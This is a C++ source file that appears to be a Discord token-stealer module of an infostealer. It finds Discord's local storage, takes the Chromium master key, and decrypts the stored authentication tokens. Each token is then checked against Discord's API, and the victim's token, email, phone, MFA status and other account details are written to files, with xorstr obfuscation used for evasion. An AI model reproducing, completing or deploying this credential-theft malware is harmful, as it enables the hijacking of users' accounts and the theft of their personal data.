//
// Created by .1qxz on 07.06.2024.
//

#include "Discord.h"

void Discord::execute(fs::path &root) {
    for(const std::string& token : this->getTokens())
    {
        fs::path discordRoot = root / xorstr_("Discord");
        Discord::writeTokenInfo(token, discordRoot);
    }
}

void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {

    std::pair<std::string, int> request = HttpUtil::sendHttpRequest("https://discordapp.com/api/v6/users/@me", {
            {"Content-Type", "application/json"},
            {"User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"},
            {"Authorization", token}
    });
    if(request.second != 200)
        return;

    json resp = json::parse(request.first);
    std::stringstream ss;
    ss << "TOKEN: " << token << "\n";
    ss << "\n";
    ss << "ID: " << std::string(resp["id"]) << "\n";
    ss << "USERNAME: " << std::string(resp["username"]) << "\n";
    ss << "GLOBAL NAME: " << std::string(resp["global_name"]) << "\n";
    ss << "LOCALE: " << StringUtil::toUpperCase(std::string(resp["locale"])) << "\n";
    ss << "\n";
    ss << "VERIFIED: " << ((resp["verified"] == true) ? "Yes" : "No") << "\n";
    ss << "";
    ss << "EMAIL: " << std::string(resp["email"]) << "\n";
    ss << "PHONE: " << std::string(resp["phone"]) << "\n";
    ss << "\n";
    ss << "NSFW ALLOWED: " << ((resp["nsfw_allowed"] == true) ? "Yes" : "No") << "\n";
    ss << "\n";
    ss << "MFA ENABLED: " << ((resp["mfa_enabled"] == true) ? "Yes" : "No") << "\n";
    ss << "\n";
    ss << "NITRO: " << ((resp["premium_type"] == 1) ? "Yes" : "No") << "\n";

    std::string bio = StringUtil::replace(std::string(resp["bio"]), "\n", " ");
    if(!bio.empty())
    {
        ss << "\n";
        ss << "BIO: " << bio;
    }

    Utils::writeFile(root / (std::string(resp["username"]) + ".txt"), ss.str());
}

std::vector<std::string> Discord::getTokens() {
    std::vector<std::string> tokens;

    for(const fs::path& path : this->discord_paths)
    {
        std::vector<std::string> scannedTokens = this->getToken(const_cast<fs::path &>(path));
        if(scannedTokens.empty())
            continue;

        for(const std::string& scannedToken : scannedTokens)
        {
            if(scannedToken.empty())
                continue;

            tokens.push_back(scannedToken);
        }
    }

    return tokens;
}

std::vector<std::string> Discord::getToken(fs::path &root) {

    if(!exists(root))
        return {};

    std::vector<BYTE> masterKey = ChromiumUtil::getMasterKey(root);
    if(masterKey.empty())
        return {};


    return this->scanToken(root, masterKey);
}

std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BYTE>& master_key) {
    std::vector<std::string> tokens;

    fs::path scan_path = root / "Local Storage" / "leveldb";
    std::regex token_regex(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");

    if (fs::exists(scan_path) && fs::is_directory(scan_path)) {
        for (const fs::path &entry: fs::directory_iterator(scan_path)) {
            if(!(entry.filename().string().ends_with(".ldb") || entry.filename().string().ends_with(".log")))
                continue;

            std::string content = Utils::readFile(entry);
            if(content.empty())
                continue;

            for(std::string &line : StringUtil::splitString(content, '\n'))
            {
                line = std::regex_replace(line, std::regex(R"(\s+$)"), "");
                std::smatch match;

                while (std::regex_search(line, match, token_regex)) {
                    std::string unformatted_token = match.str(0);
                    if (unformatted_token.back() == '\\') {
                        unformatted_token.pop_back();
                    }

                    auto pos = unformatted_token.find("dQw4w9WgXcQ:");
                    if (pos == std::string::npos) {
                        continue;
                    }

                    unformatted_token = unformatted_token.substr(unformatted_token.find("dQw4w9WgXcQ:") + 12);
                    std::vector<BYTE> decoded_token(Base64Util::b64decode(unformatted_token));

                    std::string decryptedToken = ChromiumUtil::decryptData(decoded_token, master_key);
                    tokens.push_back(decryptedToken);

                    line = match.suffix().str();
                }
            }
        }
    }

    return tokens;
}